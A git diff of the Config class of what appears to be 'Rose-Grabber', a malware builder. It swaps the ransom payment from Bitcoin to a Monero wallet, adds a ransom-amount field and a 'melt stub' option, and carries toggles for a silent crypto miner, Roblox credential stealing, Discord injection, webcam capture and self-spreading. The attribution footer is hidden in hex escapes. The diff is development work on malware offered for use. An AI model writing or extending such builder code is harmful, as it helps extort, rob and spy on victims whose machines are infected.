@@ -14,9 +14,10 @@ class Config:
         self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'
 
         self.ransomware = False
-        self.ransomware_email = 'RANSOMWARE_EMAIL_'
-        self.ransomware_btc_adress = 'RANSOMWARE_BTC_ADRESS_'
-        self.ransomware_webhook_url = 'RANSOMWARE_WEBHOOKURL'
+        self.ransomware_email_adress = 'RANS0MWARE_EMAIL'
+        self.ransomware_monero_wallet_adress = 'RANSOMWARE_MONERO_ADRESS_'
+        self.ransomware_discord_webhook_url = 'RANSOMWARE_WEBHOOKURL'
+        self.ransomware_amount_of_money = 'RANSOMWARE_AMOUNT_0F_MONEY'
 
         self.discord_ping = False
         self.injection = False
@@ -27,7 +28,6 @@ class Config:
         self.roblox_stealing = False
         self.screenshot = False
         self.start_up = False
-        self.use_scr = False
         self.silent_crypto__miner = False
         self.wallet_adress = "_WALLET_ADR_HERE"
         self.fake_error = False
@@ -37,6 +37,7 @@ class Config:
         self.webcam = False
         self.spread_malware = False
         self.spread_malware_msg = "SPRMALWARE_MSFG"
+        self.rose_melt_stub = False
 
         self.eb_color = int("\x31\x36\x37\x31\x31\x36\x38\x30")
         self.eb_footer = "\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x20\x7c\x20\x4d\x61\x64\x65\x20\x62\x79\x20\x67\x75\x6d\x62\x6f\x62\x72\x30\x74\x2c\x20\x49\x43\x45\x78\x46\x53\x2c\x20\x73\x75\x65\x67\x64\x75\x20\x61\x6e\x64\x20\x78\x70\x69\x65\x72\x72\x6f\x7a\x20\x7c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72"
@@ -109,9 +110,6 @@ class Config:
     def get_start_up(self):
         return self.start_up
     
-    def use_scr(self):
-        return self.use_scr
-    
     def silent_crypto_miner(self):
         return self.silent_crypto__miner
 
@@ -133,14 +131,17 @@ class Config:
     def get_webcam(self):
         return self.webcam
     
-    def get_ransomware_email_adr(self):
-        return self.ransomware_email
+    def get_ransomware_email_adress(self):
+        return self.ransomware_email_adress
     
-    def get_ransomware_money_adr(self):
-        return self.ransomware_btc_adress
+    def get_ransomware_amount_of_money(self):
+        return self.ransomware_amount_of_money
     
-    def get_ransomware_discord_webhook(self):
-        return self.ransomware_webhook_url
+    def get_ransomware_monero_wallet_adress(self):
+        return self.ransomware_monero_wallet_adress
+    
+    def get_ransomware_discord_webhook_url(self):
+        return self.ransomware_discord_webhook_url
     
     def get_ransomware(self):
         return self.ransomware
@@ -151,3 +152,5 @@ class Config:
     def get_spread_malware_msg(self):
         return self.spread_malware_msg
     
+    def get_rose_melt_stub(self):
+        return self.rose_melt_stub
